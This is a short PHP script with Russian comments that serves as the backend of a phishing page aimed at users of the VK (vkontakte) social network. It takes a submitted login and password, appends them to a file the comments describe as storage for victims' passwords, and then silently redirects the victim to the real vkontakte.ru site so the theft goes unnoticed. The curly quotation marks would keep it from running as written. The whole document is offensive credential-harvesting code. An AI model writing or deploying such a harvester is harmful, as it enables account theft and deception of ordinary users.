<?
$Login = $_POST[‘zabor’]; // Логин  жертвы
$Pass = $_POST[‘zena’]; // Пароль жертвы
$log = fopen(‘ups.php’,’a+’); //тут будут лежать пароли жертв
fwrite($log,'<br> $Login:$Pass \n’);
fclose($log);
echo ‘<html><head><META HTTP-EQUIV=’Refresh’ content =’0; URL=http://vkontakte.ru’></head></html>’; // перенаправляем жертву на http://vk.com
?>
